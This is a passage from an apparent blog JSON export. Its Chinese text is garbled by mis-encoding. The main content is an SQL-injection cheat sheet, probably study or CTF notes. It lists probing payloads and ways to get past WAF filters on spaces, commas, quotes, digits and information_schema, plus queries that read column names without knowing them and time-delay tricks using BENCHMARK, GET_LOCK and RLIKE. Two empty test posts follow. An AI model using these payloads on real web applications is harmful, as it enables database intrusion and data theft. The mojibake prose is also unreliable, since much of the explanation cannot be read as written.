&#39;1&#39;=&#39;1 é¡µé¢è¿”å›é”™è¯¯ 1234 3ã€æœç´¢å‹ï¼š çŒœæµ‹SQLè¯­å¥ï¼š select å­—æ®µ from è¡¨å where username like â€˜%k%â€™; http://www.sql.com/xxx.php?search=test å‡è®¾searchä¸ºå­˜åœ¨æ³¨å…¥çš„å‚æ•° http://www.sql.com/xxx.php?search=test&#39; è¯­å¥æŠ¥é”™ http://www.sql.com/xxx.php?search=test%&#39; and 1=1 and &#39;%&#39;=&#39; é¡µé¢æ­£å¸¸è¿”å›ç»“æœ http://www.sql.com/xxx.php?search=test%&#39; and 1=2 and &#39;%&#39;=&#39; é¡µé¢è¿”å›é”™è¯¯ å¸¸è§SQLæ³¨å…¥è¿‡æ»¤çš„ç»•è¿‡1-1.and/orçš„è¿‡æ»¤/æ‹¦æˆªåŒå†™ä½¿ç”¨è¿ç®—ç¬¦(||ã€&amp;&amp;)ç›´æ¥ä½¿ç”¨æ‹¼æ¥=å·ä½¿ç”¨å¼‚æˆ–æ³¨å…¥ 1-2.ç©ºæ ¼è¢«è¿‡æ»¤/æ‹¦æˆªå¤šå±‚æ‹¬å·åµŒå¥—æ”¹ç”¨+å·ä½¿ç”¨æ³¨é‡Š/**/and/oråé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª!ã€~å¯ä»¥æ›¿ä»£ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ··åˆä½¿ç”¨(è§„å¾‹åˆä¸åŒ)ï¼Œand/orå‰çš„ç©ºæ ¼å¯ç”¨çœç•¥%09, %0a, %0b, %0c, %0d, %a0ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼ï¼ˆå› ä¸ºWindowsçš„è§£ææœºåˆ¶æ— æ³•ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç©ºæ ¼ï¼Œéœ€è¦Linuxçš„æœåŠ¡å™¨ç¯å¢ƒæ‰è¡Œï¼‰ 1-3.æ‹¬å·è¢«è¿‡æ»¤/æ‹¦æˆªorder by å¤§å°æ¯”è¾ƒç›²æ³¨ï¼ˆè§ä¸‹é¢çš„è®²è§£ï¼‰ 1-4.é€—å·è¢«è¿‡æ»¤/æ‹¦æˆªæ”¹ç”¨ç›²æ³¨ ä½¿ç”¨joinè¯­å¥ä»£æ›¿ï¼Œå¦‚union select 1,2,3 å¯æ”¹ä¸º union select join(select 1) join(select 2) join(select 3) substr(data from 1 for 1)ç›¸å½“äºsubstr(data,1,1)ã€limit 9 offset 4ç›¸å½“äºlimt 9,4 1-5.information_schemaè¢«è¿‡æ»¤/æ‹¦æˆªåˆ©ç”¨innodbå­˜å‚¨å¼•æ“(éœ€è¦Mysqlç‰ˆæœ¬åœ¨5.5.xåå¹¶ä¸”Mysqlå¼€å¯äº†innoDBå¼•æ“)ï¼Œä¾‹å¦‚ä¸‹ï¼š select table_name from mysql.innodb_table_stats where database_name=database(); select table_name from mysql.innodb_index_stats where database_name=database(); æ¥ä¸‹æ¥çš„å››ä¸ªåªèƒ½ç”¨äºæŸ¥è¡¨åï¼Œæ— æ³•æŸ¥è¯¢åˆ—åï¼Œæ‰€ä»¥è¿›ä¸€æ­¥è·å–æ•°æ®è¿˜éœ€æ— åˆ—åæ³¨å…¥sys.schema_auto_increment_columnssys.x$schema_table_statistics_with_buffersys.schema_table_statistics_with_buffersys.x$ps_schema_table_statistics_io é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¡¥å……ä¸€ä¸‹æ— åˆ—åæ³¨å…¥å§ åˆ©ç”¨joinè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼ˆä½¿ç”¨åˆ«åï¼‰join â€¦ using(xx) å½“çŸ¥é“è¡¨åä¸ºusersæ—¶ï¼Œä½¿ç”¨å¦‚ä¸‹è¯­å¥å¾—åˆ°åˆ—åç¬¬ä¸€åˆ—ï¼š?id=-1â€™union all selectfrom (select from users as a join users b)c# ç¬¬äºŒåˆ—ï¼š?id=-1â€™ union all selectfrom (select from users as a join users b using(id))câ€“+ ç¬¬ä¸‰åˆ—ï¼š?id=-1â€™ union all selectfrom (select from users as a join users b using(id,username))câ€“+ åé¢çš„åˆ—åå¯ä»¥æ­¤ç±»æ¨ 1-6.å•åŒå¼•å·è¢«è¢«è¿‡æ»¤/æ‹¦æˆª/è½¬ä¹‰ å¯æ ¹æ®sqlè¯­å¥ï¼Œä½¿ç”¨è½¬ç§»ç¬¦å·é€ƒé€¸å‡ºä¸€ä¸ªå•/åŒå¼•å·ï¼Œä¾‹é¢˜å¯å‚è€ƒ[BJDCTF 2nd]ç®€å•æ³¨å…¥ éœ€è¦é€ƒé€¸å•å¼•å·çš„æƒ…å†µï¼šå°è¯•æ˜¯å¦å­˜åœ¨ç¼–ç é—®é¢˜è€Œäº§ç”Ÿçš„SQLæ³¨å…¥ã€‚ä¸éœ€è¦é€ƒé€¸å•å¼•å·çš„æƒ…å†µï¼šå­—ç¬¦ä¸²å¯ç”¨åå…­è¿›åˆ¶(hexå‡½æ•°)è¡¨ç¤ºã€ä¹Ÿå¯é€šè¿‡è¿›åˆ¶è½¬æ¢å‡½æ•°è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶æˆ–è€…ä½¿ç”¨å…¶ä»–ç¼–ç ï¼Œå¦‚char()SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) è¿˜å¯ä»¥ä½¿ç”¨%2527ä¸»è¦ç»•è¿‡magic_quotes_gpcè¿‡æ»¤ï¼Œå› ä¸º%25è§£ç ä¸º%,ç»“åˆåé¢çš„27ä¹Ÿå°±æ˜¯%27ä¹Ÿå°±æ˜¯â€™ï¼Œæ‰€ä»¥æˆåŠŸç»•è¿‡è¿‡æ»¤ã€‚ 1-7.æ•°å­—å’Œå•ä¸ªå­—æ¯è¢«è¿‡æ»¤/æ‹¦æˆªfalseæˆ–!pi()ï¼š0 trueæˆ–!!pi()ï¼š1 true+trueï¼š2 floor(pi())ï¼š3 ceil(pi())ï¼š4 floor(version())ï¼š5 ceil(version())ï¼š6 ceil(pi()+pi())ï¼š7 floor(version()+pi())ï¼š8 floor(pi()*pi())ï¼š9 ceil(pi()*pi())ï¼š10 ceil(pi()*pi())+trueï¼š11 ceil(pi()+pi()+version())ï¼š12 floor(pi()*pi()+pi())ï¼š13 ceil(pi()*pi()+pi())ï¼š14 ceil(pi()*pi()+version())ï¼š15 floor(pi()*version())ï¼š16 ceil(pi()*version())ï¼š17 ceil(pi()*version())+trueï¼š18 floor((pi()+pi())*pi())ï¼š19 ceil((pi()+pi())*pi())ï¼š20 ceil(ceil(pi())*version())ï¼š21 ceil(pi()*ceil(pi()+pi()))ï¼š22 ceil((pi()+ceil(pi()))*pi())ï¼š23 ceil(pi())*ceil(version())ï¼š24 floor(pi()*(version()+pi()))ï¼š25 floor(version()*version())ï¼š26 ceil(version()*version())ï¼š27 ceil(pi()*pi()*pi()-pi())ï¼š28 floor(pi()*pi()*floor(pi()))ï¼š29 ä½¿ç”¨conv([0-9],10,36)å¯ä»¥è¡¨ç¤º0~9çš„æ•°å­—ï¼Œconv([10~35],10,36)å¯ä»¥è¡¨ç¤ºa~zå•ä¸ªå­—æ¯ï¼Œconv([35+],10,36)å¯è‡ªè¡ŒæŒ‰ç…§ä¸‰åå…­è¿›åˆ¶è½¬æ¢ 1-8.å…¶ä»–ç³»ç»Ÿå…³é”®å­—è¢«è¿‡æ»¤/æ‹¦æˆªåŒå†™ç»•è¿‡å…³é”®å­—è¿‡æ»¤ä½¿ç”¨åŒä¹‰å‡½æ•°/è¯­å¥ä»£æ›¿ï¼Œå¦‚ifå‡½æ•°å¯ç”¨å¦‚ä¸‹è¯­å¥ä»£æ›¿ã€‚ case when condition then 1 else 0 end 1-9.ç­‰å·è¢«è¿‡æ»¤ä½¿ç”¨inæˆ–likeå…³é”®å­—ç»•è¿‡ 1-10.è¿‡æ»¤sleep() BENCHMARK(count,expr)BENCHMARK()å‡½æ•°é‡å¤countTimesæ¬¡æ‰§è¡Œè¡¨è¾¾å¼exprï¼Œå®ƒå¯ä»¥ç”¨äºè®¡æ—¶MySQLå¤„ç†è¡¨è¾¾å¼æœ‰å¤šå¿«ã€‚ç»“æœå€¼æ€»æ˜¯0ã€‚ ç¬›å¡å°”ç§¯select if(1=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0); GET_LOCKåœ¨ä¸€ä¸ªsessionä¸­å¯ä»¥å…ˆé”å®šä¸€ä¸ªå˜é‡ä¾‹å¦‚ï¼šselect get_lock(â€˜smi1eâ€™,1)ç„¶åé€šè¿‡å¦ä¸€ä¸ªsession å†æ¬¡æ‰§è¡Œget_lockå‡½æ•° select get_lock(â€˜smi1eâ€™,5),æ­¤æ—¶ä¼šäº§ç”Ÿ5 ç§’çš„å»¶è¿Ÿï¼Œå…¶æ•ˆæœç±»ä¼¼äºsleep(5)ã€‚ä½†æ˜¯åˆ©ç”¨åœºæ™¯æ˜¯æœ‰æ¡ä»¶é™åˆ¶çš„ï¼šéœ€è¦æä¾›é•¿è¿æ¥ã€‚åœ¨Apache+PHPæ­å»ºçš„ç¯å¢ƒä¸­éœ€è¦ä½¿ç”¨ mysql_pconnectå‡½æ•°æ¥è¿æ¥æ•°æ®åº“ã€‚ RLIKE/REGEXPé€šè¿‡rpadæˆ–repeatæ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„patternï¼Œé€šè¿‡repeatçš„å‚æ•°å¯ä»¥æ§åˆ¶å»¶æ—¶é•¿çŸ­ã€‚select rpad(â€˜aâ€™,4999999,â€™aâ€™) RLIKE concat(repeat(â€˜(a.*)+â€™,30),â€™bâ€™)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"/tags/å­¦ä¹ /"},{"name":"SQLæ³¨å…¥æ¼æ´","slug":"SQLæ³¨å…¥æ¼æ´","permalink":"/tags/SQLæ³¨å…¥æ¼æ´/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"ç¬¬ä¸€æ¬¡test","slug":"test","date":"2020-10-30T16:00:00.000Z","updated":"2021-03-03T14:22:17.306Z","comments":true,"path":"2020/10/31/test/","link":"","permalink":"/2020/10/31/test/","excerpt":"","text":"testï¼testï¼testï¼","categories":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"/categories/ç”Ÿæ´»/"}],"tags":[{"name":"æ‚¦è¯»","slug":"æ‚¦è¯»","permalink":"/tags/æ‚¦è¯»/"},{"name":"ç»ƒä¹ ","slug":"ç»ƒä¹ ","permalink":"/tags/ç»ƒä¹ /"}],"keywords":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"/categories/ç”Ÿæ´»/"}]},{"title":"test2","slug":"test2","date":"2020-10-30T16:00:00.000Z","updated":"2021-03-03T14:22:20.993Z","comments":true,"path":"2020/10/31/test2/","link":"","permalink":"/2020/10/31/test2/","excerpt":"","text":"test2","categories":[{"name":"éšæƒ³","slug":"éšæƒ³","permalink":"/categories/éšæƒ³/"}],"tags":[],"keywords":[{"name":"éšæƒ³","slug":"éšæƒ³","permalink":"/categories/éšæƒ³/"}]}]}